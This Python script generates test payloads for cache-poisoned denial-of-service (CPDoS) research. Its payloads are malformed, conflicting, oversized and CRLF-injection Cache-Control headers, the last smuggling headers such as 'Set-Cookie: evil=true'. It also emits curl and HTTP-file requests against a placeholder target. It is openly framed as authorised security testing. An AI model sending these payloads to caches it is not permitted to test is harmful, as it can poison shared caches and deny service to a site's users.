#!/usr/bin/env python3
"""
Cache-Control CPDoS Test Variations Generator
For ethical security research on CDN/Origin cache poisoning
"""

# Base directives from MDN
BASE_DIRECTIVES = [
    "max-age",
    "max-stale", 
    "min-fresh",
    "s-maxage",
    "no-cache",
    "no-store",
    "no-transform",
    "only-if-cached",
    "stale-if-error"
]

def generate_test_cases():
    """Generate various malformed Cache-Control header variations"""
    
    test_cases = []
    
    # Category 1: Case Variations
    print("=" * 60)
    print("CATEGORY 1: CASE SENSITIVITY TESTS")
    print("=" * 60)
    
    for directive in BASE_DIRECTIVES:
        # Full uppercase
        test_cases.append(f"{directive.upper()}")
        # Mixed case (random patterns)
        test_cases.append(f"{directive.title()}")
        # Alternating case
        alt_case = ''.join(c.upper() if i % 2 else c.lower() 
                          for i, c in enumerate(directive))
        test_cases.append(alt_case)
    
    # Print case variations
    for tc in test_cases[-len(BASE_DIRECTIVES)*3:]:
        print(f"Cache-Control: {tc}=3600" if '=' not in tc and 'no-' not in tc 
              else f"Cache-Control: {tc}")
    
    # Category 2: Malformed Syntax
    print("\n" + "=" * 60)
    print("CATEGORY 2: MALFORMED SYNTAX")
    print("=" * 60)
    
    syntax_tests = [
        # Missing equals sign
        "max-age 3600",
        "s-maxage 600",
        # Extra equals signs
        "max-age==3600",
        "max-age=3600=",
        # Space around equals
        "max-age = 3600",
        "max-age= 3600",
        "max-age =3600",
        # Invalid separators
        "max-age;3600",
        "max-age:3600",
        # Extra commas
        "max-age=3600,,no-cache",
        ",max-age=3600",
        "max-age=3600,",
        # Missing commas
        "max-age=3600 no-cache",
        # Quotes (when not expected)
        'max-age="3600"',
        "max-age='3600'",
        # Leading/trailing spaces in value
        "max-age= 3600 ",
        "max-age=\t3600",
    ]
    
    for tc in syntax_tests:
        print(f"Cache-Control: {tc}")
        test_cases.append(tc)
    
    # Category 3: Invalid Values
    print("\n" + "=" * 60)
    print("CATEGORY 3: INVALID VALUES")
    print("=" * 60)
    
    invalid_values = [
        # Negative values
        "max-age=-3600",
        "s-maxage=-1",
        # Overflow values
        "max-age=999999999999999999999",
        "max-age=9999999999",
        # Non-numeric values
        "max-age=abc",
        "max-age=3600seconds",
        "s-maxage=1h",
        # Special characters
        "max-age=3600\x00",
        "max-age=3600\r\n",
        "max-age=3600;",
        # Floating point (when integer expected)
        "max-age=3600.5",
        "max-age=1e6",
        # Boolean directives with values
        "no-cache=true",
        "no-store=false",
        "no-transform=1",
    ]
    
    for tc in invalid_values:
        print(f"Cache-Control: {tc}")
        test_cases.append(tc)
    
    # Category 4: Conflicting Directives
    print("\n" + "=" * 60)
    print("CATEGORY 4: CONFLICTING DIRECTIVES")
    print("=" * 60)
    
    conflicting = [
        "no-cache, only-if-cached",
        "no-store, max-age=3600",
        "max-age=0, max-age=3600",
        "public, private",
        "immutable, must-revalidate",
        "no-cache, max-age=3600, no-store",
    ]
    
    for tc in conflicting:
        print(f"Cache-Control: {tc}")
        test_cases.append(tc)
    
    # Category 5: Unknown/Invalid Directives
    print("\n" + "=" * 60)
    print("CATEGORY 5: UNKNOWN/INVALID DIRECTIVES")
    print("=" * 60)
    
    unknown = [
        "invalid-directive",
        "max-age=3600, fake-directive=123",
        "x-custom-cache=true",
        "cache-control=yes",  # Recursive reference
        "max_age=3600",  # Underscore instead of hyphen
        "maxage=3600",  # No hyphen
        "max--age=3600",  # Double hyphen
    ]
    
    for tc in unknown:
        print(f"Cache-Control: {tc}")
        test_cases.append(tc)
    
    # Category 6: Oversized Headers
    print("\n" + "=" * 60)
    print("CATEGORY 6: OVERSIZED HEADERS")
    print("=" * 60)
    
    oversized = [
        "max-age=" + "9" * 1000,
        "max-age=3600, " + "no-cache, " * 500,
        "x" * 8000,  # 8KB of 'x'
        "max-age=3600," + "a=b," * 1000,
    ]
    
    for i, tc in enumerate(oversized):
        preview = tc[:50] + "..." if len(tc) > 50 else tc
        print(f"Cache-Control: {preview} [Total length: {len(tc)}]")
        test_cases.append(tc)
    
    # Category 7: Injection Attempts
    print("\n" + "=" * 60)
    print("CATEGORY 7: INJECTION ATTEMPTS")
    print("=" * 60)
    
    injection = [
        "max-age=3600\r\nX-Injected: header",
        "max-age=3600\nSet-Cookie: evil=true",
        "max-age=3600%0d%0aX-Injected: header",
        "max-age=3600\\r\\nX-Injected: header",
        "max-age=3600; Set-Cookie: evil=true",
    ]
    
    for tc in injection:
        print(f"Cache-Control: {repr(tc)}")
        test_cases.append(tc)
    
    return test_cases

def generate_curl_commands(base_url, test_cases):
    """Generate curl commands for testing"""
    print("\n" + "=" * 60)
    print("CURL TEST COMMANDS")
    print("=" * 60)
    print("\nReplace YOUR_TARGET_URL with your test endpoint\n")
    
    for i, tc in enumerate(test_cases[:20]):  # Show first 20 examples
        safe_tc = tc.replace('"', '\\"').replace('$', '\\$')
        print(f'# Test {i+1}')
        print(f'curl -H "Cache-Control: {safe_tc}" "YOUR_TARGET_URL"')
        print()

def generate_http_file(test_cases, filename="cache_control_tests.http"):
    """Generate HTTP file for tools like HTTPie or REST clients"""
    print(f"\nGenerating {filename}...")
    
    with open(filename, 'w') as f:
        f.write("# Cache-Control CPDoS Test Cases\n")
        f.write("# Use with HTTPie, REST Client, or similar tools\n")
        f.write("# Replace YOUR_TARGET_URL with your test endpoint\n\n")
        
        for i, tc in enumerate(test_cases):
            f.write(f"### Test Case {i+1}\n")
            f.write(f"GET YOUR_TARGET_URL HTTP/1.1\n")
            f.write(f"Host: your-target-host.com\n")
            f.write(f"Cache-Control: {tc}\n")
            f.write(f"\n###\n\n")
    
    print(f"Generated {len(test_cases)} test cases in {filename}")

if __name__ == "__main__":
    print("Cache-Control CPDoS Test Suite Generator")
    print("For Ethical Security Research Only\n")
    
    test_cases = generate_test_cases()
    
    print(f"\n{'=' * 60}")
    print(f"Total test cases generated: {len(test_cases)}")
    print(f"{'=' * 60}\n")
    
    # Uncomment to generate files
    # generate_curl_commands("https://your-target.com/test", test_cases)
    # generate_http_file(test_cases)
    
    print("\nREMINDER: Only test on systems you own or have explicit permission to test!")
    print("Document all findings responsibly and follow coordinated disclosure practices.")
